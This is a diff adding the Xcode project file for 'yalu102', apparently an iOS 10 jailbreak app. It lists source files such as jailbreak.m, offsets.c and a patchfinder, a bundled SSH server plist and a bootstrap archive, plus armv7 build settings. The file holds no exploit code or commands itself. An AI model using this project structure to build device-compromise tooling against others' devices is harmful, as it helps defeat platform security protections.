+		EA9901051E219FF10056FEBD /* bootstrap.tar */ = {isa = PBXFileReference; lastKnownFileType = archive.tar; path = bootstrap.tar; sourceTree = "<group>"; };
+		EA9901091E21A04C0056FEBD /* tar */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = tar; sourceTree = "<group>"; };
+		EA99010B1E21A0520056FEBD /* launchctl */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = launchctl; sourceTree = "<group>"; };
+		EA99010D1E21A1560056FEBD /* jailbreak.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = jailbreak.m; sourceTree = "<group>"; };
+		EA99010F1E21A1A00056FEBD /* pte_stuff.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = pte_stuff.h; sourceTree = "<group>"; };
+		EA9901131E21A1B00056FEBD /* iokitmig64.o */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.objfile"; path = iokitmig64.o; sourceTree = "<group>"; };
+		EA9901151E21A1D90056FEBD /* devicesupport.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = devicesupport.h; sourceTree = "<group>"; };
+		EA9901161E21A1D90056FEBD /* devicesupport.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = devicesupport.m; sourceTree = "<group>"; };
+		EA9901181E21A2180056FEBD /* IOKit.tbd */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = "sourcecode.text-based-dylib-definition"; path = IOKit.tbd; sourceTree = "<group>"; };
+		EAA7F7C61E3EE4AF00BE3C64 /* dropbear.plist */ = {isa = PBXFileReference; explicitFileType = file.bplist; path = dropbear.plist; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		EA9900E01E1E9F060056FEBD /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA9901141E21A1B00056FEBD /* iokitmig64.o in Frameworks */,
+				EA1A3B9D1E391C4F009CA025 /* patchfinder64.o in Frameworks */,
+				EA9901191E21A2180056FEBD /* IOKit.tbd in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		EA9900DA1E1E9F060056FEBD = {
+			isa = PBXGroup;
+			children = (
+				EA9900E51E1E9F060056FEBD /* yalu102 */,
+				EA9900E41E1E9F060056FEBD /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		EA9900E41E1E9F060056FEBD /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				EA9900E31E1E9F060056FEBD /* yalu102.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		EA9900E51E1E9F060056FEBD /* yalu102 */ = {
+			isa = PBXGroup;
+			children = (
+				EAA7F7C61E3EE4AF00BE3C64 /* dropbear.plist */,
+				EA1A3B9B1E38BBDB009CA025 /* patchfinder64.h */,
+				EA9901021E219C210056FEBD /* offsets.c */,
+				EA9901031E219C210056FEBD /* offsets.h */,
+				EA99010D1E21A1560056FEBD /* jailbreak.m */,
+				EA9900E91E1E9F060056FEBD /* AppDelegate.h */,
+				EA1A3BA61E398E33009CA025 /* 0.reload.plist */,
+				EA1A3BAC1E399006009CA025 /* reload */,
+				EA9900EA1E1E9F060056FEBD /* AppDelegate.m */,
+				EA9900EC1E1E9F060056FEBD /* ViewController.h */,
+				EA9900ED1E1E9F060056FEBD /* ViewController.m */,
+				EA9900EF1E1E9F060056FEBD /* Main.storyboard */,
+				EA9900F41E1E9F060056FEBD /* LaunchScreen.storyboard */,
+				EA9900F71E1E9F060056FEBD /* Info.plist */,
+				EA9901051E219FF10056FEBD /* bootstrap.tar */,
+				EA9901091E21A04C0056FEBD /* tar */,
+				EA99010B1E21A0520056FEBD /* launchctl */,
+				EA9901131E21A1B00056FEBD /* iokitmig64.o */,
+				EA1A3B9C1E391C4F009CA025 /* patchfinder64.o */,
+				EA99010F1E21A1A00056FEBD /* pte_stuff.h */,
+				EA1A3BC41E39D1FF009CA025 /* Assets.xcassets */,
+				EA9901181E21A2180056FEBD /* IOKit.tbd */,
+				EA9901151E21A1D90056FEBD /* devicesupport.h */,
+				EA9901161E21A1D90056FEBD /* devicesupport.m */,
+				EA9900E61E1E9F060056FEBD /* Supporting Files */,
+			);
+			path = yalu102;
+			sourceTree = "<group>";
+		};
+		EA9900E61E1E9F060056FEBD /* Supporting Files */ = {
+			isa = PBXGroup;
+			children = (
+				EA9900E71E1E9F060056FEBD /* main.m */,
+			);
+			name = "Supporting Files";
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		EA9900E21E1E9F060056FEBD /* yalu102 */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = EA9900FA1E1E9F060056FEBD /* Build configuration list for PBXNativeTarget "yalu102" */;
+			buildPhases = (
+				EA9900DF1E1E9F060056FEBD /* Sources */,
+				EA9900E01E1E9F060056FEBD /* Frameworks */,
+				EA9900E11E1E9F060056FEBD /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = yalu102;
+			productName = yalu102;
+			productReference = EA9900E31E1E9F060056FEBD /* yalu102.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		EA9900DB1E1E9F060056FEBD /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 0820;
+				ORGANIZATIONNAME = kimjongcracks;
+				TargetAttributes = {
+					EA9900E21E1E9F060056FEBD = {
+						CreatedOnToolsVersion = 8.2.1;
+						DevelopmentTeam = CGTX3WH3ZS;
+						ProvisioningStyle = Automatic;
+					};
+				};
+			};
+			buildConfigurationList = EA9900DE1E1E9F060056FEBD /* Build configuration list for PBXProject "yalu102" */;
+			compatibilityVersion = "Xcode 3.2";
+			developmentRegion = English;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = EA9900DA1E1E9F060056FEBD;
+			productRefGroup = EA9900E41E1E9F060056FEBD /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				EA9900E21E1E9F060056FEBD /* yalu102 */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		EA9900E11E1E9F060056FEBD /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA99010A1E21A04C0056FEBD /* tar in Resources */,
+				EA99010C1E21A0520056FEBD /* launchctl in Resources */,
+				EA9901061E219FF10056FEBD /* bootstrap.tar in Resources */,
+				EA1A3BA81E398E33009CA025 /* 0.reload.plist in Resources */,
+				EAA7F7C71E3EE4AF00BE3C64 /* dropbear.plist in Resources */,
+				EA9900F61E1E9F060056FEBD /* LaunchScreen.storyboard in Resources */,
+				EA1A3BAD1E399006009CA025 /* reload in Resources */,
+				EA1A3BC51E39D1FF009CA025 /* Assets.xcassets in Resources */,
+				EA9900F11E1E9F060056FEBD /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		EA9900DF1E1E9F060056FEBD /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				EA9901041E219C210056FEBD /* offsets.c in Sources */,
+				EA9901171E21A1D90056FEBD /* devicesupport.m in Sources */,
+				EA9900EE1E1E9F060056FEBD /* ViewController.m in Sources */,
+				EA9900EB1E1E9F060056FEBD /* AppDelegate.m in Sources */,
+				EA99010E1E21A1560056FEBD /* jailbreak.m in Sources */,
+				EA9900E81E1E9F060056FEBD /* main.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		EA9900EF1E1E9F060056FEBD /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				EA9900F01E1E9F060056FEBD /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		EA9900F41E1E9F060056FEBD /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				EA9900F51E1E9F060056FEBD /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		EA9900F81E1E9F060056FEBD /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = armv7;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_BITCODE = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
+				LD_NO_PIE = YES;
+				MTL_ENABLE_DEBUG_INFO = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		EA9900F91E1E9F060056FEBD /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = armv7;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_BITCODE = NO;
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
+				LD_NO_PIE = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				SDKROOT = iphoneos;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		EA9900FB1E1E9F060056FEBD /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = armv7;
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CLANG_ENABLE_OBJC_ARC = NO;
+				DEVELOPMENT_TEAM = CGTX3WH3ZS;
+				INFOPLIST_FILE = yalu102/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/yalu102",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = kim.cracksby.yalu102;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				VALID_ARCHS = armv7;
+			};
+			name = Debug;
+		};
+		EA9900FC1E1E9F060056FEBD /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = armv7;
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CLANG_ENABLE_OBJC_ARC = NO;
+				DEVELOPMENT_TEAM = CGTX3WH3ZS;
+				INFOPLIST_FILE = yalu102/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/yalu102",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = kim.cracksby.yalu102;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				VALID_ARCHS = armv7;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		EA9900DE1E1E9F060056FEBD /* Build configuration list for PBXProject "yalu102" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				EA9900F81E1E9F060056FEBD /* Debug */,
+				EA9900F91E1E9F060056FEBD /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		EA9900FA1E1E9F060056FEBD /* Build configuration list for PBXNativeTarget "yalu102" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				EA9900FB1E1E9F060056FEBD /* Debug */,
+				EA9900FC1E1E9F060056FEBD /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = EA9900DB1E1E9F060056FEBD /* Project object */;
+}
